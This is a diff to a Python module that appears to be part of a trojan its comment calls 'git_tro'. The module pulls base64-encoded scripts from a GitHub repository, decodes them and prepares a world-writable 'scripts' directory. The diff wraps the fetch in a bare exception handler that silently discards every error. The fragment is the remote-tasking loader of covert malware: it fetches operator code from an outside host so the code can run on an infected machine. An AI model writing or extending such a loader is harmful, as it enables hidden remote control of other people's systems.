@@ -14,23 +14,26 @@ def connect_to_github():
 	return gh,repo,branch
 
 def get_file_contents(filepath):
-	gh,repo,branch = connect_to_github()
-	tree = branch.commit.commit.tree.to_tree().recurse()
-	for filename in tree.tree:
-		if filepath in filename.path:
-			print("[OK] Found file %s" % filepath)
-			blob = repo.blob(filename._json_data['sha']) #Hashed content
-			if encodedFiles:
-				return base64.b64decode(blob.content)
-			return blob.content
-	return None
+    try:
+        gh,repo,branch = connect_to_github()
+        tree = branch.commit.commit.tree.to_tree().recurse()
+        for filename in tree.tree:
+            if filepath in filename.path:
+                print("[OK] Found file %s" % filepath)
+                blob = repo.blob(filename._json_data['sha']) #Hashed content
+                if encodedFiles:
+                        return base64.b64decode(blob.content)
+                return blob.content
+    except:
+        pass
+    return None
 
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
 	script	= get_file_contents(scriptPath)
 	#content = None
 	if script is not None:
-		content	= base64.b64decode(script)
+		content	= base64.b64decode(script).decode()
 		print(content)
 		try:
 			os.makedirs("scripts", mode=777)
